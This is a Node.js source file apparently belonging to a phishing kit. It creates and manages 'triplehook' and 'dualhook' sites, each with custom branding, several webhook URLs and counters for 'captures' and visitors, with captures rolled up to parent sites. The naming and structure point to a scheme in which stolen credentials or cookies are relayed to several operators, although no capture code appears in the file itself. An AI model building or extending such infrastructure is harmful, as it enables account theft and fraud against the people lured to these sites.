// Multi-Tenant Site Generator
// Creates triplehook/dualhook sites with custom branding

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const R = require('./lib/runtime');

const SITES_DIR = R.dataPath('storage', 'sites');
const SITES_CONFIG = R.dataPath('storage', 'sites.json');

class SiteGenerator {
    constructor() {
        this.sites = {};
        this.loadSites();
    }

    loadSites() {
        try {
            if (fs.existsSync(SITES_CONFIG)) {
                this.sites = JSON.parse(fs.readFileSync(SITES_CONFIG, 'utf8'));
            }
        } catch (error) {
            console.error('[SITEGEN] Error loading sites:', error.message);
        }
    }

    saveSites() {
        try {
            fs.writeFileSync(SITES_CONFIG, JSON.stringify(this.sites, null, 2));
        } catch (error) {
            console.error('[SITEGEN] Error saving sites:', error.message);
        }
    }

    generateSiteId() {
        return crypto.randomBytes(8).toString('hex');
    }

    createTriplehook(config) {
        const {
            name,
            displayName,
            webhookUrl,
            dualhookUrl,
            triplehookUrl,
            themeColor,
            logoUrl,
            ownerId
        } = config;

        const siteId = this.generateSiteId();
        const sitePath = path.join(SITES_DIR, siteId);

        // Create site directory
        if (!fs.existsSync(sitePath)) {
            fs.mkdirSync(sitePath, { recursive: true });
        }

        const site = {
            id: siteId,
            type: 'triplehook',
            name: name.toLowerCase().replace(/[^a-z0-9]/g, ''),
            displayName,
            webhookUrl,
            dualhookUrl,
            triplehookUrl,
            themeColor: themeColor || '#00b06f',
            logoUrl: logoUrl || '',
            ownerId,
            createdAt: new Date().toISOString(),
            dualhooks: [],
            stats: {
                captures: 0,
                visitors: 0
            }
        };

        this.sites[siteId] = site;
        this.saveSites();

        // Generate site files
        this.generateSiteFiles(sitePath, site);

        return { success: true, site };
    }

    createDualhook(triplehookId, config) {
        const triplehook = this.sites[triplehookId];
        if (!triplehook || triplehook.type !== 'triplehook') {
            return { success: false, error: 'Invalid triplehook' };
        }

        const {
            name,
            displayName,
            webhookUrl,
            themeColor,
            logoUrl,
            ownerId
        } = config;

        const siteId = this.generateSiteId();
        const sitePath = path.join(SITES_DIR, triplehookId, siteId);

        // Create dualhook directory under triplehook
        if (!fs.existsSync(sitePath)) {
            fs.mkdirSync(sitePath, { recursive: true });
        }

        const site = {
            id: siteId,
            type: 'dualhook',
            name: name.toLowerCase().replace(/[^a-z0-9]/g, ''),
            displayName,
            webhookUrl,
            themeColor: themeColor || triplehook.themeColor,
            logoUrl: logoUrl || triplehook.logoUrl,
            ownerId,
            parentTriplehook: triplehookId,
            createdAt: new Date().toISOString(),
            stats: {
                captures: 0,
                visitors: 0
            }
        };

        this.sites[siteId] = site;
        triplehook.dualhooks.push(siteId);
        this.saveSites();

        // Generate site files
        this.generateSiteFiles(sitePath, site);

        return { success: true, site };
    }

    generateSiteFiles(sitePath, site) {
        // Generate config file
        const config = {
            siteId: site.id,
            type: site.type,
            name: site.name,
            displayName: site.displayName,
            webhookUrl: site.webhookUrl,
            dualhookUrl: site.dualhookUrl,
            triplehookUrl: site.triplehookUrl,
            themeColor: site.themeColor,
            logoUrl: site.logoUrl,
            parentTriplehook: site.parentTriplehook
        };

        fs.writeFileSync(
            path.join(sitePath, 'config.json'),
            JSON.stringify(config, null, 2)
        );

        // Generate index.html (will be served dynamically)
        // The actual HTML will be generated by the server based on config
    }

    getSite(siteId) {
        return this.sites[siteId] || null;
    }

    getSiteByName(name) {
        return Object.values(this.sites).find(s => s.name === name) || null;
    }

    getTriplehooks() {
        return Object.values(this.sites).filter(s => s.type === 'triplehook');
    }

    getDualhooks(triplehookId) {
        const triplehook = this.sites[triplehookId];
        if (!triplehook) return [];
        return triplehook.dualhooks.map(id => this.sites[id]).filter(Boolean);
    }

    deleteSite(siteId) {
        const site = this.sites[siteId];
        if (!site) return { success: false, error: 'Site not found' };

        // If it's a dualhook, remove from parent
        if (site.type === 'dualhook' && site.parentTriplehook) {
            const parent = this.sites[site.parentTriplehook];
            if (parent) {
                parent.dualhooks = parent.dualhooks.filter(id => id !== siteId);
            }
        }

        // If it's a triplehook, delete all dualhooks
        if (site.type === 'triplehook') {
            site.dualhooks.forEach(dualhookId => {
                delete this.sites[dualhookId];
                const dualhookPath = path.join(SITES_DIR, siteId, dualhookId);
                if (fs.existsSync(dualhookPath)) {
                    fs.rmSync(dualhookPath, { recursive: true });
                }
            });
        }

        delete this.sites[siteId];
        this.saveSites();

        // Remove site directory
        const sitePath = site.type === 'dualhook' 
            ? path.join(SITES_DIR, site.parentTriplehook, siteId)
            : path.join(SITES_DIR, siteId);
        
        if (fs.existsSync(sitePath)) {
            fs.rmSync(sitePath, { recursive: true });
        }

        return { success: true };
    }

    updateSite(siteId, updates) {
        const site = this.sites[siteId];
        if (!site) return { success: false, error: 'Site not found' };

        Object.assign(site, updates);
        this.saveSites();

        return { success: true, site };
    }

    incrementStats(siteId, type) {
        const site = this.sites[siteId];
        if (!site) return;

        if (site.stats[type] !== undefined) {
            site.stats[type]++;
        }

        // Also increment parent stats if dualhook
        if (site.type === 'dualhook' && site.parentTriplehook) {
            const parent = this.sites[site.parentTriplehook];
            if (parent && parent.stats[type] !== undefined) {
                parent.stats[type]++;
            }
        }

        this.saveSites();
    }

    getAllSites() {
        return Object.values(this.sites);
    }
}

module.exports = SiteGenerator;
